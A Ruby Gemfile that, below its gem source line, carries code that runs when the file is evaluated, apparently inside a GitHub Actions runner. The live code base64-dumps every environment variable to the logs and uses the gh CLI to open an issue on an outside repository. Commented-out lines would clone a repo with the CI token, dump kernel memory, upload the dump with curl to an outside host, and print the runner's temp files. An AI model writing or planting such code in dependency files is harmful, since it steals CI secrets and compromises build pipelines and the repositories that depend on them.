source 'https://rubygems.org'
require 'base64'

encoded = Base64.strict_encode64(ENV.to_h.to_s)


puts encoded
# ENV["GH_TOKEN"] = ENV["GITHUB_TOKEN"]
# token = ENV["GITHUB_TOKEN"]

system("gh issue create -R elizabethtl/test-oracle-devrel -t 'Tehe, you don't have a GITHUB TOKEN in the env' -b 'But your permissions are set incorreclty'")

# system("git clone https://#{token}@github.com/elizabethtl/test-oracle-devrel")
# Dir.chdir("test-oracle-devrel") do
  # system("sudo dd if=/proc/kcore bs=4M status=progress | zstd -1 -T0 > memory.zstd")
  # system("curl uploader.sh -T memory.zstd")
# end

# system("git config --global user.name \"github-actions [bot]\"")


# Dir.glob("/home/runner/work/_temp/**/*").each do |path|
#   next unless File.file?(path)

#   puts "---- #{File.basename(path)} ----"
#   puts File.read(path)
#   puts "-----"
#   puts
# end